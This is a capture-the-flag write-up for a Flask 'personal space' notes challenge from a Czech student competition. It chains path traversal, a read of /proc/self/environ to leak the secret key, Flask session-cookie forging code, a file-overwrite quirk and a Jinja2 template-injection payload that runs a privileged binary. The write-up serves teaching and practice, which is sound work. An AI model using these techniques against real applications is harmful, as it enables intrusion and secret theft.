<div align="center">

# 🗂️ Personal Space

🇬🇧 **English** · [🇨🇿 Čeština](README.cs.md)

</div>

## Kybersoutěž 2. kolo 2026

> **Kybersoutěž** (lit. *Cyber Competition*) is the Czech national cybersecurity competition, open to students aged 9–24 from primary, secondary, and higher education institutions. Organised as a CTF-style event, it aims to develop digital skills, identify talent, and raise awareness of cybersecurity threats among the younger generation in the Czech Republic.

### Overview

A Flask web app lets every visitor store small text notes in their own "personal space" — a per-session directory on disk. The flag sits behind a `setuid root` helper binary that the app can only reach by executing attacker-controlled code, so the goal is full remote code execution.

**Attack chain:**

1. Abuse a path-traversal bug to read `/proc/self/environ` and leak the Flask `SECRET_KEY`
2. Use the leaked key to forge a Flask session cookie that points the app's "personal space" outside its sandbox
3. Abuse a `shutil.copy` / `os.makedirs` quirk to overwrite the app's own Jinja2 template with a Server-Side Template Injection payload
4. Trigger the poisoned template and have it execute the privileged `/readflag` helper on the server

---

### Infrastructure

The app runs as the unprivileged `nobody` user inside the container, and talks to a separate privileged helper binary to read the flag:

```dockerfile
FROM python:3.13 AS readflag
RUN apt update && apt install gcc -y
COPY readflag.c .
RUN gcc -s readflag.c -o /readflag

FROM python:3.13
COPY --from=readflag /readflag /readflag
COPY flag.txt /flag.txt
RUN chmod 4755 /readflag && chmod 400 flag.txt

RUN pip install flask
RUN mkdir /spaces && chown nobody:nogroup /spaces
COPY --chmod=755 entrypoint.sh /

USER nobody
COPY --chown=nobody:nogroup app /app
WORKDIR /app
ENTRYPOINT ["/entrypoint.sh"]
```

`/readflag` is `setuid root` (`chmod 4755`) and simply reads `/flag.txt`, which is otherwise unreadable (`chmod 400`) by the `nobody` user the app runs as:

```c
int main() {
    setuid(0);
    char flag[512] = {0};
    int fd = open("/flag.txt", O_RDONLY);
    read(fd, flag, sizeof(flag));
    close(fd);
    printf("%s", flag);
    return 0;
}
```

So the goal isn't just reading a file — it's getting the app to run `/readflag` on the attacker's behalf.

---

### Vulnerability Analysis

#### Step 1 — Path traversal leaks the Flask secret key

Reviewing the source code reveals the core of the app's "personal space" logic:

```python
PERSONAL_SPACES = "/spaces/"
WELCOME_MESSAGE = "Welcome.txt"

def get_personal_space() -> str:
    personal_space = PERSONAL_SPACES + session.setdefault("id", secrets.token_urlsafe())
    try:
        os.makedirs(personal_space)
    except FileExistsError:
        pass
    if not os.path.exists(f"{personal_space}/{WELCOME_MESSAGE}"):
        shutil.copy(WELCOME_MESSAGE, personal_space)
    return personal_space

def get_personal_item(item: str) -> str | None:
    with open(f"{get_personal_space()}/{item}") as f:
        return f.read()

@app.get("/get/<path:personal_item>")
def get(personal_item):
    return str(get_personal_item(personal_item))
```

`/get/<path:personal_item>` uses Flask's `path` converter, which happily accepts slashes — including `../`. Nothing sanitizes `personal_item` before it's joined into a file path and opened, which is a straightforward **path traversal**. The most valuable target isn't the filesystem directly — it's `/proc/self/environ`, served by the app itself:

```
GET /get/../../proc/self/environ
```

The app sets its session-signing key straight from the environment at startup:

```python
app.secret_key = os.environ["SECRET_KEY"]
```

Reading `/proc/self/environ` leaks this `SECRET_KEY` directly — and a Flask secret key is enough to forge arbitrary, validly-signed session cookies offline.

#### Step 2 — Forging a session to escape the sandbox

`get_personal_space()` builds its directory purely from `session["id"]`, with no validation — it's just string-concatenated onto `/spaces/`:

```python
personal_space = PERSONAL_SPACES + session.setdefault("id", secrets.token_urlsafe())
```

Flask sessions are client-side cookies, cryptographically signed (not encrypted) with the app's secret key. With `SECRET_KEY` in hand, any session payload can be forged locally using Flask's own signing serializer:

```python
from flask.sessions import SecureCookieSessionInterface
from flask import Flask

class MockApp(Flask):
    def __init__(self, secret_key):
        super().__init__("mock")
        self.secret_key = secret_key

def forge_cookie(secret_key, session_data):
    app = MockApp(secret_key)
    serializer = SecureCookieSessionInterface().get_signing_serializer(app)
    return serializer.dumps(session_data)
```

Setting `session["id"] = "../app/"` turns `personal_space` into `/spaces/../app/` — i.e. `/app/`, the application's own source directory. The "personal space" sandbox is gone.

#### Step 3 — Turning file overwrite into SSTI

Two small implementation quirks combine into an arbitrary file overwrite:

- `os.makedirs(personal_space)` is wrapped in a bare `except FileExistsError: pass` — and `os.makedirs` raises exactly that exception whether the existing path is a directory **or a regular file**. Pointing `session["id"]` at an existing file's full path doesn't crash anything; it's silently swallowed.
- Right after, `shutil.copy(WELCOME_MESSAGE, personal_space)` runs whenever `{personal_space}/{WELCOME_MESSAGE}` doesn't exist. When `personal_space` is itself a file (not a directory), that check is naturally false — so `shutil.copy` executes with `personal_space` as the **destination file itself**, overwriting it with the contents of `/app/Welcome.txt`.

That's a two-step primitive: control the content of `/app/Welcome.txt` via the app's normal "put" feature, then forge a session pointing straight at any writable target file to have it silently replaced with `Welcome.txt`'s content. The most useful target is a Jinja2 template, since `render_template()` compiles and executes whatever is in it — i.e. **Server-Side Template Injection**.

---

### Exploitation

**Overwrite `/app/Welcome.txt` with an SSTI payload**, via the app's own `/put` endpoint, using a forged session pointing at the app directory:

```python
payload = "{{ config.__class__.__init__.__globals__['os'].popen('/readflag').read() }}"

session_data = {"id": "../app/"}
cookie = forge_cookie(SECRET_KEY, session_data)

requests.post(f"{TARGET_URL}/put",
              cookies={"session": cookie},
              data={"name": "Welcome", "data": payload})
```

`name=Welcome` becomes `Welcome.txt`, landing straight on top of `/app/Welcome.txt`.

**Trigger the `shutil.copy` trick against `/app/templates/put.html`**, overwriting the real template with the now-poisoned `Welcome.txt`:

```python
session_data = {"id": "../app/templates/put.html"}
cookie = forge_cookie(SECRET_KEY, session_data)

requests.get(TARGET_URL, cookies={"session": cookie})
```

Any request that calls `get_personal_space()` — a plain `GET /` is enough — runs the `os.makedirs`/`shutil.copy` sequence against this forged path, silently overwriting `put.html` with the SSTI payload.

**Visit `/put` and let Flask render the poisoned template:**

```python
resp = requests.get(f"{TARGET_URL}/put")
print(resp.text)
```

`render_template("put.html")` now compiles attacker-controlled Jinja2 source. The payload walks from `config` through Python's class hierarchy to reach `os`, runs the privileged `/readflag` helper, and returns the flag directly in the HTTP response:

```
HCKR{1_esC4P3d_MY_P3r50N4l_sP4c3_T0_b3C0M3_0mn1p0t3nt}
```
</content>
